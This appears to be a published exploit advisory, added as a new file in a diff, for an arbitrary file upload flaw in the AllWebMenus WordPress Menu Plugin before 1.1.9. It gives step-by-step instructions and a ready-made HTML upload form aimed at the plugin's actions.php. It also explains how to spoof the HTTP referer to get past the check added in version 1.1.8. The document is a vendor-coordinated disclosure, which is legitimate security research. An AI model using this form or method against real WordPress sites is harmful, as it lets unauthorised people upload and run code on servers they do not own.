@@ -1,0 +1,27 @@
+#Exploit Title: AllWebMenus WordPress Menu Plugin Arbitrary file upload
+#Version:  < 1.1.9
+#Date: 2012-01-19
+#Author: 6Scan (http://6scan.com) security team
+#Software Link: http://wordpress.org/extend/plugins/allwebmenus-wordpress-menu-plugin/
+#Official fix: This advisory is released after the vendor was contacted and fixed the issue promptly.
+#Description:  Unauthorized users could upload arbitrary files to the vulnerable server, potentially executing commands
+
+AllWebMenus WordPress Menu Plugin
+<1.1.8  Remote File upload
+
+On versions < 1.1.8 , lack of checks in script actions.php allowed malicious user to upload any file to the vulnerable server.
+Create a file (For example, Wordpress_security.php , with this content <?php echo '6Scan to the rescue';  ?> )
+Compress it with zip to awm.zip
+
+Use this form to upload the php file to the server
+
+<form action="http://server/wp-content/plugins/allwebmenus-wordpress-menu-plugin/actions.php" method=post enctype="multipart/form-data">
+<input type="file" name="awm1" size=100>
+<input type="hidden" name="AWM_menu_id" value="2134234">
+<input type="hidden" name="theaction" value="zip_update">
+<input type=submit>
+</form>
+
+
+Version 1.1.8 also checks the source referrer, so you have to use scripting language (or spoof it in another way) to set the HTTP_REFERER to 
+"wp-admin/options-general.php?page=allwebmenus-wordpress-menu-plugin/allwebmenus-wordpress-menu.php"
